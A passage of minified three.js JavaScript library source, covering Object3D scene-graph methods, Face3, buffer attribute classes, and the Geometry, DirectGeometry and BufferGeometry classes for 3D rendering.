a.applyMatrix4(this.matrixWorld)},worldToLocal:function(){var a=new THREE.Matrix4;return function(b){return b.applyMatrix4(a.getInverse(this.matrixWorld))}}(),\nlookAt:function(){var a=new THREE.Matrix4;return function(b){a.lookAt(b,this.position,this.up);this.quaternion.setFromRotationMatrix(a)}}(),add:function(a){if(1<arguments.length){for(var b=0;b<arguments.length;b++)this.add(arguments[b]);return this}if(a===this)return console.error(\"THREE.Object3D.add: object can't be added as a child of itself.\",a),this;a instanceof THREE.Object3D?(null!==a.parent&&a.parent.remove(a),a.parent=this,a.dispatchEvent({type:\"added\"}),this.children.push(a)):console.error(\"THREE.Object3D.add: object not an instance of THREE.Object3D.\",\na);return this},remove:function(a){if(1<arguments.length)for(var b=0;b<arguments.length;b++)this.remove(arguments[b]);b=this.children.indexOf(a);-1!==b&&(a.parent=null,a.dispatchEvent({type:\"removed\"}),this.children.splice(b,1))},getObjectById:function(a){return this.getObjectByProperty(\"id\",a)},getObjectByName:function(a){return this.getObjectByProperty(\"name\",a)},getObjectByProperty:function(a,b){if(this[a]===b)return this;for(var c=0,d=this.children.length;c<d;c++){var e=this.children[c].getObjectByProperty(a,\nb);if(void 0!==e)return e}},getWorldPosition:function(a){a=a||new THREE.Vector3;this.updateMatrixWorld(!0);return a.setFromMatrixPosition(this.matrixWorld)},getWorldQuaternion:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c){c=c||new THREE.Quaternion;this.updateMatrixWorld(!0);this.matrixWorld.decompose(a,c,b);return c}}(),getWorldRotation:function(){var a=new THREE.Quaternion;return function(b){b=b||new THREE.Euler;this.getWorldQuaternion(a);return b.setFromQuaternion(a,\nthis.rotation.order,!1)}}(),getWorldScale:function(){var a=new THREE.Vector3,b=new THREE.Quaternion;return function(c){c=c||new THREE.Vector3;this.updateMatrixWorld(!0);this.matrixWorld.decompose(a,b,c);return c}}(),getWorldDirection:function(){var a=new THREE.Quaternion;return function(b){b=b||new THREE.Vector3;this.getWorldQuaternion(a);return b.set(0,0,1).applyQuaternion(a)}}(),raycast:function(){},traverse:function(a){a(this);for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].traverse(a)},traverseVisible:function(a){if(!1!==\nthis.visible){a(this);for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].traverseVisible(a)}},traverseAncestors:function(a){var b=this.parent;null!==b&&(a(b),b.traverseAncestors(a))},updateMatrix:function(){this.matrix.compose(this.position,this.quaternion,this.scale);this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(a){!0===this.matrixAutoUpdate&&this.updateMatrix();if(!0===this.matrixWorldNeedsUpdate||!0===a)null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,\nthis.matrix),this.matrixWorldNeedsUpdate=!1,a=!0;for(var b=0,c=this.children.length;b<c;b++)this.children[b].updateMatrixWorld(a)},toJSON:function(a){function b(a){var b=[],c;for(c in a){var d=a[c];delete d.metadata;b.push(d)}return b}var c=void 0===a||\"\"===a,d={};c&&(a={geometries:{},materials:{},textures:{},images:{}},d.metadata={version:4.4,type:\"Object\",generator:\"Object3D.toJSON\"});var e={};e.uuid=this.uuid;e.type=this.type;\"\"!==this.name&&(e.name=this.name);\"{}\"!==JSON.stringify(this.userData)&&\n(e.userData=this.userData);!0===this.castShadow&&(e.castShadow=!0);!0===this.receiveShadow&&(e.receiveShadow=!0);!1===this.visible&&(e.visible=!1);e.matrix=this.matrix.toArray();void 0!==this.geometry&&(void 0===a.geometries[this.geometry.uuid]&&(a.geometries[this.geometry.uuid]=this.geometry.toJSON(a)),e.geometry=this.geometry.uuid);void 0!==this.material&&(void 0===a.materials[this.material.uuid]&&(a.materials[this.material.uuid]=this.material.toJSON(a)),e.material=this.material.uuid);if(0<this.children.length){e.children=\n[];for(var f=0;f<this.children.length;f++)e.children.push(this.children[f].toJSON(a).object)}if(c){var c=b(a.geometries),f=b(a.materials),g=b(a.textures);a=b(a.images);0<c.length&&(d.geometries=c);0<f.length&&(d.materials=f);0<g.length&&(d.textures=g);0<a.length&&(d.images=a)}d.object=e;return d},clone:function(a){return(new this.constructor).copy(this,a)},copy:function(a,b){void 0===b&&(b=!0);this.name=a.name;this.up.copy(a.up);this.position.copy(a.position);this.quaternion.copy(a.quaternion);this.scale.copy(a.scale);\nthis.matrix.copy(a.matrix);this.matrixWorld.copy(a.matrixWorld);this.matrixAutoUpdate=a.matrixAutoUpdate;this.matrixWorldNeedsUpdate=a.matrixWorldNeedsUpdate;this.visible=a.visible;this.castShadow=a.castShadow;this.receiveShadow=a.receiveShadow;this.frustumCulled=a.frustumCulled;this.renderOrder=a.renderOrder;this.userData=JSON.parse(JSON.stringify(a.userData));if(!0===b)for(var c=0;c<a.children.length;c++)this.add(a.children[c].clone());return this}});THREE.Object3DIdCount=0;\nTHREE.Face3=function(a,b,c,d,e,f){this.a=a;this.b=b;this.c=c;this.normal=d instanceof THREE.Vector3?d:new THREE.Vector3;this.vertexNormals=Array.isArray(d)?d:[];this.color=e instanceof THREE.Color?e:new THREE.Color;this.vertexColors=Array.isArray(e)?e:[];this.materialIndex=void 0!==f?f:0};\nTHREE.Face3.prototype={constructor:THREE.Face3,clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a=a.a;this.b=a.b;this.c=a.c;this.normal.copy(a.normal);this.color.copy(a.color);this.materialIndex=a.materialIndex;for(var b=0,c=a.vertexNormals.length;b<c;b++)this.vertexNormals[b]=a.vertexNormals[b].clone();b=0;for(c=a.vertexColors.length;b<c;b++)this.vertexColors[b]=a.vertexColors[b].clone();return this}};\nTHREE.BufferAttribute=function(a,b,c){this.uuid=THREE.Math.generateUUID();this.array=a;this.itemSize=b;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.version=0;this.normalized=!0===c};\nTHREE.BufferAttribute.prototype={constructor:THREE.BufferAttribute,get count(){return this.array.length/this.itemSize},set needsUpdate(a){!0===a&&this.version++},setDynamic:function(a){this.dynamic=a;return this},copy:function(a){this.array=new a.array.constructor(a.array);this.itemSize=a.itemSize;this.dynamic=a.dynamic;return this},copyAt:function(a,b,c){a*=this.itemSize;c*=b.itemSize;for(var d=0,e=this.itemSize;d<e;d++)this.array[a+d]=b.array[c+d];return this},copyArray:function(a){this.array.set(a);\nreturn this},copyColorsArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyColorsArray(): color is undefined\",d),f=new THREE.Color);b[c++]=f.r;b[c++]=f.g;b[c++]=f.b}return this},copyIndicesArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];b[c++]=f.a;b[c++]=f.b;b[c++]=f.c}return this},copyVector2sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector2sArray(): vector is undefined\",\nd),f=new THREE.Vector2);b[c++]=f.x;b[c++]=f.y}return this},copyVector3sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector3sArray(): vector is undefined\",d),f=new THREE.Vector3);b[c++]=f.x;b[c++]=f.y;b[c++]=f.z}return this},copyVector4sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector4sArray(): vector is undefined\",d),f=new THREE.Vector4);\nb[c++]=f.x;b[c++]=f.y;b[c++]=f.z;b[c++]=f.w}return this},set:function(a,b){void 0===b&&(b=0);this.array.set(a,b);return this},getX:function(a){return this.array[a*this.itemSize]},setX:function(a,b){this.array[a*this.itemSize]=b;return this},getY:function(a){return this.array[a*this.itemSize+1]},setY:function(a,b){this.array[a*this.itemSize+1]=b;return this},getZ:function(a){return this.array[a*this.itemSize+2]},setZ:function(a,b){this.array[a*this.itemSize+2]=b;return this},getW:function(a){return this.array[a*\nthis.itemSize+3]},setW:function(a,b){this.array[a*this.itemSize+3]=b;return this},setXY:function(a,b,c){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;return this},setXYZ:function(a,b,c,d){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;return this},setXYZW:function(a,b,c,d,e){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;this.array[a+3]=e;return this},clone:function(){return(new this.constructor).copy(this)}};\nTHREE.Int8Attribute=function(a,b){return new THREE.BufferAttribute(new Int8Array(a),b)};THREE.Uint8Attribute=function(a,b){return new THREE.BufferAttribute(new Uint8Array(a),b)};THREE.Uint8ClampedAttribute=function(a,b){return new THREE.BufferAttribute(new Uint8ClampedArray(a),b)};THREE.Int16Attribute=function(a,b){return new THREE.BufferAttribute(new Int16Array(a),b)};THREE.Uint16Attribute=function(a,b){return new THREE.BufferAttribute(new Uint16Array(a),b)};\nTHREE.Int32Attribute=function(a,b){return new THREE.BufferAttribute(new Int32Array(a),b)};THREE.Uint32Attribute=function(a,b){return new THREE.BufferAttribute(new Uint32Array(a),b)};THREE.Float32Attribute=function(a,b){return new THREE.BufferAttribute(new Float32Array(a),b)};THREE.Float64Attribute=function(a,b){return new THREE.BufferAttribute(new Float64Array(a),b)};\nTHREE.DynamicBufferAttribute=function(a,b){console.warn(\"THREE.DynamicBufferAttribute has been removed. Use new THREE.BufferAttribute().setDynamic( true ) instead.\");return(new THREE.BufferAttribute(a,b)).setDynamic(!0)};THREE.InstancedBufferAttribute=function(a,b,c){THREE.BufferAttribute.call(this,a,b);this.meshPerAttribute=c||1};THREE.InstancedBufferAttribute.prototype=Object.create(THREE.BufferAttribute.prototype);THREE.InstancedBufferAttribute.prototype.constructor=THREE.InstancedBufferAttribute;\nTHREE.InstancedBufferAttribute.prototype.copy=function(a){THREE.BufferAttribute.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return this};THREE.InterleavedBuffer=function(a,b){this.uuid=THREE.Math.generateUUID();this.array=a;this.stride=b;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.version=0};\nTHREE.InterleavedBuffer.prototype={constructor:THREE.InterleavedBuffer,get length(){return this.array.length},get count(){return this.array.length/this.stride},set needsUpdate(a){!0===a&&this.version++},setDynamic:function(a){this.dynamic=a;return this},copy:function(a){this.array=new a.array.constructor(a.array);this.stride=a.stride;this.dynamic=a.dynamic;return this},copyAt:function(a,b,c){a*=this.stride;c*=b.stride;for(var d=0,e=this.stride;d<e;d++)this.array[a+d]=b.array[c+d];return this},set:function(a,\nb){void 0===b&&(b=0);this.array.set(a,b);return this},clone:function(){return(new this.constructor).copy(this)}};THREE.InstancedInterleavedBuffer=function(a,b,c){THREE.InterleavedBuffer.call(this,a,b);this.meshPerAttribute=c||1};THREE.InstancedInterleavedBuffer.prototype=Object.create(THREE.InterleavedBuffer.prototype);THREE.InstancedInterleavedBuffer.prototype.constructor=THREE.InstancedInterleavedBuffer;\nTHREE.InstancedInterleavedBuffer.prototype.copy=function(a){THREE.InterleavedBuffer.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return this};THREE.InterleavedBufferAttribute=function(a,b,c){this.uuid=THREE.Math.generateUUID();this.data=a;this.itemSize=b;this.offset=c};\nTHREE.InterleavedBufferAttribute.prototype={constructor:THREE.InterleavedBufferAttribute,get length(){console.warn(\"THREE.BufferAttribute: .length has been deprecated. Please use .count.\");return this.array.length},get count(){return this.data.count},setX:function(a,b){this.data.array[a*this.data.stride+this.offset]=b;return this},setY:function(a,b){this.data.array[a*this.data.stride+this.offset+1]=b;return this},setZ:function(a,b){this.data.array[a*this.data.stride+this.offset+2]=b;return this},\nsetW:function(a,b){this.data.array[a*this.data.stride+this.offset+3]=b;return this},getX:function(a){return this.data.array[a*this.data.stride+this.offset]},getY:function(a){return this.data.array[a*this.data.stride+this.offset+1]},getZ:function(a){return this.data.array[a*this.data.stride+this.offset+2]},getW:function(a){return this.data.array[a*this.data.stride+this.offset+3]},setXY:function(a,b,c){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;return this},setXYZ:function(a,\nb,c,d){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;return this},setXYZW:function(a,b,c,d,e){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;this.data.array[a+3]=e;return this}};\nTHREE.Geometry=function(){Object.defineProperty(this,\"id\",{value:THREE.GeometryIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"Geometry\";this.vertices=[];this.colors=[];this.faces=[];this.faceVertexUvs=[[]];this.morphTargets=[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.lineDistancesNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.uvsNeedUpdate=this.elementsNeedUpdate=\nthis.verticesNeedUpdate=!1};\nObject.assign(THREE.Geometry.prototype,THREE.EventDispatcher.prototype,{applyMatrix:function(a){for(var b=(new THREE.Matrix3).getNormalMatrix(a),c=0,d=this.vertices.length;c<d;c++)this.vertices[c].applyMatrix4(a);c=0;for(d=this.faces.length;c<d;c++){a=this.faces[c];a.normal.applyMatrix3(b).normalize();for(var e=0,f=a.vertexNormals.length;e<f;e++)a.vertexNormals[e].applyMatrix3(b).normalize()}null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();\nthis.normalsNeedUpdate=this.verticesNeedUpdate=!0;return this},rotateX:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationX(b);this.applyMatrix(a);return this}}(),rotateY:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationY(b);this.applyMatrix(a);return this}}(),rotateZ:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationZ(b);this.applyMatrix(a);return this}}(),translate:function(){var a;return function(b,\nc,d){void 0===a&&(a=new THREE.Matrix4);a.makeTranslation(b,c,d);this.applyMatrix(a);return this}}(),scale:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeScale(b,c,d);this.applyMatrix(a);return this}}(),lookAt:function(){var a;return function(b){void 0===a&&(a=new THREE.Object3D);a.lookAt(b);a.updateMatrix();this.applyMatrix(a.matrix)}}(),fromBufferGeometry:function(a){function b(a,b,d,e){var f=void 0!==g?[n[a].clone(),n[b].clone(),n[d].clone()]:[],q=void 0!==h?[c.colors[a].clone(),\nc.colors[b].clone(),c.colors[d].clone()]:[];e=new THREE.Face3(a,b,d,f,q,e);c.faces.push(e);void 0!==k&&c.faceVertexUvs[0].push([p[a].clone(),p[b].clone(),p[d].clone()]);void 0!==l&&c.faceVertexUvs[1].push([m[a].clone(),m[b].clone(),m[d].clone()])}var c=this,d=null!==a.index?a.index.array:void 0,e=a.attributes,f=e.position.array,g=void 0!==e.normal?e.normal.array:void 0,h=void 0!==e.color?e.color.array:void 0,k=void 0!==e.uv?e.uv.array:void 0,l=void 0!==e.uv2?e.uv2.array:void 0;void 0!==l&&(this.faceVertexUvs[1]=\n[]);for(var n=[],p=[],m=[],q=e=0;e<f.length;e+=3,q+=2)c.vertices.push(new THREE.Vector3(f[e],f[e+1],f[e+2])),void 0!==g&&n.push(new THREE.Vector3(g[e],g[e+1],g[e+2])),void 0!==h&&c.colors.push(new THREE.Color(h[e],h[e+1],h[e+2])),void 0!==k&&p.push(new THREE.Vector2(k[q],k[q+1])),void 0!==l&&m.push(new THREE.Vector2(l[q],l[q+1]));if(void 0!==d)if(f=a.groups,0<f.length)for(e=0;e<f.length;e++)for(var r=f[e],s=r.start,t=r.count,q=s,s=s+t;q<s;q+=3)b(d[q],d[q+1],d[q+2],r.materialIndex);else for(e=0;e<\nd.length;e+=3)b(d[e],d[e+1],d[e+2]);else for(e=0;e<f.length/3;e+=3)b(e,e+1,e+2);this.computeFaceNormals();null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());null!==a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());return this},center:function(){this.computeBoundingBox();var a=this.boundingBox.center().negate();this.translate(a.x,a.y,a.z);return a},normalize:function(){this.computeBoundingSphere();var a=this.boundingSphere.center,b=this.boundingSphere.radius,b=0===b?1:1/\nb,c=new THREE.Matrix4;c.set(b,0,0,-b*a.x,0,b,0,-b*a.y,0,0,b,-b*a.z,0,0,0,1);this.applyMatrix(c);return this},computeFaceNormals:function(){for(var a=new THREE.Vector3,b=new THREE.Vector3,c=0,d=this.faces.length;c<d;c++){var e=this.faces[c],f=this.vertices[e.a],g=this.vertices[e.b];a.subVectors(this.vertices[e.c],g);b.subVectors(f,g);a.cross(b);a.normalize();e.normal.copy(a)}},computeVertexNormals:function(a){void 0===a&&(a=!0);var b,c,d;d=Array(this.vertices.length);b=0;for(c=this.vertices.length;b<\nc;b++)d[b]=new THREE.Vector3;if(a){var e,f,g,h=new THREE.Vector3,k=new THREE.Vector3;a=0;for(b=this.faces.length;a<b;a++)c=this.faces[a],e=this.vertices[c.a],f=this.vertices[c.b],g=this.vertices[c.c],h.subVectors(g,f),k.subVectors(e,f),h.cross(k),d[c.a].add(h),d[c.b].add(h),d[c.c].add(h)}else for(a=0,b=this.faces.length;a<b;a++)c=this.faces[a],d[c.a].add(c.normal),d[c.b].add(c.normal),d[c.c].add(c.normal);b=0;for(c=this.vertices.length;b<c;b++)d[b].normalize();a=0;for(b=this.faces.length;a<b;a++)c=\nthis.faces[a],e=c.vertexNormals,3===e.length?(e[0].copy(d[c.a]),e[1].copy(d[c.b]),e[2].copy(d[c.c])):(e[0]=d[c.a].clone(),e[1]=d[c.b].clone(),e[2]=d[c.c].clone());0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){var a,b,c,d,e;c=0;for(d=this.faces.length;c<d;c++)for(e=this.faces[c],e.__originalFaceNormal?e.__originalFaceNormal.copy(e.normal):e.__originalFaceNormal=e.normal.clone(),e.__originalVertexNormals||(e.__originalVertexNormals=[]),a=0,b=e.vertexNormals.length;a<\nb;a++)e.__originalVertexNormals[a]?e.__originalVertexNormals[a].copy(e.vertexNormals[a]):e.__originalVertexNormals[a]=e.vertexNormals[a].clone();var f=new THREE.Geometry;f.faces=this.faces;a=0;for(b=this.morphTargets.length;a<b;a++){if(!this.morphNormals[a]){this.morphNormals[a]={};this.morphNormals[a].faceNormals=[];this.morphNormals[a].vertexNormals=[];e=this.morphNormals[a].faceNormals;var g=this.morphNormals[a].vertexNormals,h,k;c=0;for(d=this.faces.length;c<d;c++)h=new THREE.Vector3,k={a:new THREE.Vector3,\nb:new THREE.Vector3,c:new THREE.Vector3},e.push(h),g.push(k)}g=this.morphNormals[a];f.vertices=this.morphTargets[a].vertices;f.computeFaceNormals();f.computeVertexNormals();c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],h=g.faceNormals[c],k=g.vertexNormals[c],h.copy(e.normal),k.a.copy(e.vertexNormals[0]),k.b.copy(e.vertexNormals[1]),k.c.copy(e.vertexNormals[2])}c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],e.normal=e.__originalFaceNormal,e.vertexNormals=e.__originalVertexNormals},computeTangents:function(){console.warn(\"THREE.Geometry: .computeTangents() has been removed.\")},\ncomputeLineDistances:function(){for(var a=0,b=this.vertices,c=0,d=b.length;c<d;c++)0<c&&(a+=b[c].distanceTo(b[c-1])),this.lineDistances[c]=a},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new THREE.Box3);this.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new THREE.Sphere);this.boundingSphere.setFromPoints(this.vertices)},merge:function(a,b,c){if(!1===a instanceof THREE.Geometry)console.error(\"THREE.Geometry.merge(): geometry not an instance of THREE.Geometry.\",\na);else{var d,e=this.vertices.length,f=this.vertices,g=a.vertices,h=this.faces,k=a.faces,l=this.faceVertexUvs[0];a=a.faceVertexUvs[0];void 0===c&&(c=0);void 0!==b&&(d=(new THREE.Matrix3).getNormalMatrix(b));for(var n=0,p=g.length;n<p;n++){var m=g[n].clone();void 0!==b&&m.applyMatrix4(b);f.push(m)}n=0;for(p=k.length;n<p;n++){var g=k[n],q,r=g.vertexNormals,s=g.vertexColors,m=new THREE.Face3(g.a+e,g.b+e,g.c+e);m.normal.copy(g.normal);void 0!==d&&m.normal.applyMatrix3(d).normalize();b=0;for(f=r.length;b<\nf;b++)q=r[b].clone(),void 0!==d&&q.applyMatrix3(d).normalize(),m.vertexNormals.push(q);m.color.copy(g.color);b=0;for(f=s.length;b<f;b++)q=s[b],m.vertexColors.push(q.clone());m.materialIndex=g.materialIndex+c;h.push(m)}n=0;for(p=a.length;n<p;n++)if(c=a[n],d=[],void 0!==c){b=0;for(f=c.length;b<f;b++)d.push(c[b].clone());l.push(d)}}},mergeMesh:function(a){!1===a instanceof THREE.Mesh?console.error(\"THREE.Geometry.mergeMesh(): mesh not an instance of THREE.Mesh.\",a):(a.matrixAutoUpdate&&a.updateMatrix(),\nthis.merge(a.geometry,a.matrix))},mergeVertices:function(){var a={},b=[],c=[],d,e=Math.pow(10,4),f,g;f=0;for(g=this.vertices.length;f<g;f++)d=this.vertices[f],d=Math.round(d.x*e)+\"_\"+Math.round(d.y*e)+\"_\"+Math.round(d.z*e),void 0===a[d]?(a[d]=f,b.push(this.vertices[f]),c[f]=b.length-1):c[f]=c[a[d]];a=[];f=0;for(g=this.faces.length;f<g;f++)for(e=this.faces[f],e.a=c[e.a],e.b=c[e.b],e.c=c[e.c],e=[e.a,e.b,e.c],d=0;3>d;d++)if(e[d]===e[(d+1)%3]){a.push(f);break}for(f=a.length-1;0<=f;f--)for(e=a[f],this.faces.splice(e,\n1),c=0,g=this.faceVertexUvs.length;c<g;c++)this.faceVertexUvs[c].splice(e,1);f=this.vertices.length-b.length;this.vertices=b;return f},sortFacesByMaterialIndex:function(){for(var a=this.faces,b=a.length,c=0;c<b;c++)a[c]._id=c;a.sort(function(a,b){return a.materialIndex-b.materialIndex});var d=this.faceVertexUvs[0],e=this.faceVertexUvs[1],f,g;d&&d.length===b&&(f=[]);e&&e.length===b&&(g=[]);for(c=0;c<b;c++){var h=a[c]._id;f&&f.push(d[h]);g&&g.push(e[h])}f&&(this.faceVertexUvs[0]=f);g&&(this.faceVertexUvs[1]=\ng)},toJSON:function(){function a(a,b,c){return c?a|1<<b:a&~(1<<b)}function b(a){var b=a.x.toString()+a.y.toString()+a.z.toString();if(void 0!==l[b])return l[b];l[b]=k.length/3;k.push(a.x,a.y,a.z);return l[b]}function c(a){var b=a.r.toString()+a.g.toString()+a.b.toString();if(void 0!==p[b])return p[b];p[b]=n.length;n.push(a.getHex());return p[b]}function d(a){var b=a.x.toString()+a.y.toString();if(void 0!==q[b])return q[b];q[b]=m.length/2;m.push(a.x,a.y);return q[b]}var e={metadata:{version:4.4,type:\"Geometry\",\ngenerator:\"Geometry.toJSON\"}};e.uuid=this.uuid;e.type=this.type;\"\"!==this.name&&(e.name=this.name);if(void 0!==this.parameters){var f=this.parameters,g;for(g in f)void 0!==f[g]&&(e[g]=f[g]);return e}f=[];for(g=0;g<this.vertices.length;g++){var h=this.vertices[g];f.push(h.x,h.y,h.z)}var h=[],k=[],l={},n=[],p={},m=[],q={};for(g=0;g<this.faces.length;g++){var r=this.faces[g],s=void 0!==this.faceVertexUvs[0][g],t=0<r.normal.length(),u=0<r.vertexNormals.length,v=1!==r.color.r||1!==r.color.g||1!==r.color.b,\nC=0<r.vertexColors.length,w=0,w=a(w,0,0),w=a(w,1,!0),w=a(w,2,!1),w=a(w,3,s),w=a(w,4,t),w=a(w,5,u),w=a(w,6,v),w=a(w,7,C);h.push(w);h.push(r.a,r.b,r.c);h.push(r.materialIndex);s&&(s=this.faceVertexUvs[0][g],h.push(d(s[0]),d(s[1]),d(s[2])));t&&h.push(b(r.normal));u&&(t=r.vertexNormals,h.push(b(t[0]),b(t[1]),b(t[2])));v&&h.push(c(r.color));C&&(r=r.vertexColors,h.push(c(r[0]),c(r[1]),c(r[2])))}e.data={};e.data.vertices=f;e.data.normals=k;0<n.length&&(e.data.colors=n);0<m.length&&(e.data.uvs=[m]);e.data.faces=\nh;return e},clone:function(){return(new THREE.Geometry).copy(this)},copy:function(a){this.vertices=[];this.faces=[];this.faceVertexUvs=[[]];for(var b=a.vertices,c=0,d=b.length;c<d;c++)this.vertices.push(b[c].clone());b=a.faces;c=0;for(d=b.length;c<d;c++)this.faces.push(b[c].clone());c=0;for(d=a.faceVertexUvs.length;c<d;c++){b=a.faceVertexUvs[c];void 0===this.faceVertexUvs[c]&&(this.faceVertexUvs[c]=[]);for(var e=0,f=b.length;e<f;e++){for(var g=b[e],h=[],k=0,l=g.length;k<l;k++)h.push(g[k].clone());\nthis.faceVertexUvs[c].push(h)}}return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}});THREE.GeometryIdCount=0;\nTHREE.DirectGeometry=function(){Object.defineProperty(this,\"id\",{value:THREE.GeometryIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"DirectGeometry\";this.indices=[];this.vertices=[];this.normals=[];this.colors=[];this.uvs=[];this.uvs2=[];this.groups=[];this.morphTargets={};this.skinWeights=[];this.skinIndices=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.uvsNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.verticesNeedUpdate=!1};\nObject.assign(THREE.DirectGeometry.prototype,THREE.EventDispatcher.prototype,{computeBoundingBox:THREE.Geometry.prototype.computeBoundingBox,computeBoundingSphere:THREE.Geometry.prototype.computeBoundingSphere,computeFaceNormals:function(){console.warn(\"THREE.DirectGeometry: computeFaceNormals() is not a method of this type of geometry.\")},computeVertexNormals:function(){console.warn(\"THREE.DirectGeometry: computeVertexNormals() is not a method of this type of geometry.\")},computeGroups:function(a){var b,\nc=[],d;a=a.faces;for(var e=0;e<a.length;e++){var f=a[e];f.materialIndex!==d&&(d=f.materialIndex,void 0!==b&&(b.count=3*e-b.start,c.push(b)),b={start:3*e,materialIndex:d})}void 0!==b&&(b.count=3*e-b.start,c.push(b));this.groups=c},fromGeometry:function(a){var b=a.faces,c=a.vertices,d=a.faceVertexUvs,e=d[0]&&0<d[0].length,f=d[1]&&0<d[1].length,g=a.morphTargets,h=g.length,k;if(0<h){k=[];for(var l=0;l<h;l++)k[l]=[];this.morphTargets.position=k}var n=a.morphNormals,p=n.length,m;if(0<p){m=[];for(l=0;l<\np;l++)m[l]=[];this.morphTargets.normal=m}for(var q=a.skinIndices,r=a.skinWeights,s=q.length===c.length,t=r.length===c.length,l=0;l<b.length;l++){var u=b[l];this.vertices.push(c[u.a],c[u.b],c[u.c]);var v=u.vertexNormals;3===v.length?this.normals.push(v[0],v[1],v[2]):(v=u.normal,this.normals.push(v,v,v));v=u.vertexColors;3===v.length?this.colors.push(v[0],v[1],v[2]):(v=u.color,this.colors.push(v,v,v));!0===e&&(v=d[0][l],void 0!==v?this.uvs.push(v[0],v[1],v[2]):(console.warn(\"THREE.DirectGeometry.fromGeometry(): Undefined vertexUv \",\nl),this.uvs.push(new THREE.Vector2,new THREE.Vector2,new THREE.Vector2)));!0===f&&(v=d[1][l],void 0!==v?this.uvs2.push(v[0],v[1],v[2]):(console.warn(\"THREE.DirectGeometry.fromGeometry(): Undefined vertexUv2 \",l),this.uvs2.push(new THREE.Vector2,new THREE.Vector2,new THREE.Vector2)));for(v=0;v<h;v++){var C=g[v].vertices;k[v].push(C[u.a],C[u.b],C[u.c])}for(v=0;v<p;v++)C=n[v].vertexNormals[l],m[v].push(C.a,C.b,C.c);s&&this.skinIndices.push(q[u.a],q[u.b],q[u.c]);t&&this.skinWeights.push(r[u.a],r[u.b],\nr[u.c])}this.computeGroups(a);this.verticesNeedUpdate=a.verticesNeedUpdate;this.normalsNeedUpdate=a.normalsNeedUpdate;this.colorsNeedUpdate=a.colorsNeedUpdate;this.uvsNeedUpdate=a.uvsNeedUpdate;this.groupsNeedUpdate=a.groupsNeedUpdate;return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}});\nTHREE.BufferGeometry=function(){Object.defineProperty(this,\"id\",{value:THREE.GeometryIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"BufferGeometry\";this.index=null;this.attributes={};this.morphAttributes={};this.groups=[];this.boundingSphere=this.boundingBox=null;this.drawRange={start:0,count:Infinity}};\nObject.assign(THREE.BufferGeometry.prototype,THREE.EventDispatcher.prototype,{getIndex:function(){return this.index},setIndex:function(a){this.index=a},addAttribute:function(a,b,c){if(!1===b instanceof THREE.BufferAttribute&&!1===b instanceof THREE.InterleavedBufferAttribute)console.warn(\"THREE.BufferGeometry: .addAttribute() now expects ( name, attribute ).\"),this.addAttribute(a,new THREE.BufferAttribute(b,c));else if(\"index\"===a)console.warn(\"THREE.BufferGeometry.addAttribute: Use .setIndex() for index attribute.\"),\nthis.setIndex(b);else return this.attributes[a]=b,this},getAttribute:function(a){return this.attributes[a]},removeAttribute:function(a){delete this.attributes[a];return this},addGroup:function(a,b,c){this.groups.push({start:a,count:b,materialIndex:void 0!==c?c:0})},clearGroups:function(){this.groups=[]},setDrawRange:function(a,b){this.drawRange.start=a;this.drawRange.count=b},applyMatrix:function(a){var b=this.attributes.position;void 0!==b&&(a.applyToVector3Array(b.array),b.needsUpdate=!0);b=this.attributes.normal;\nvoid 0!==b&&((new 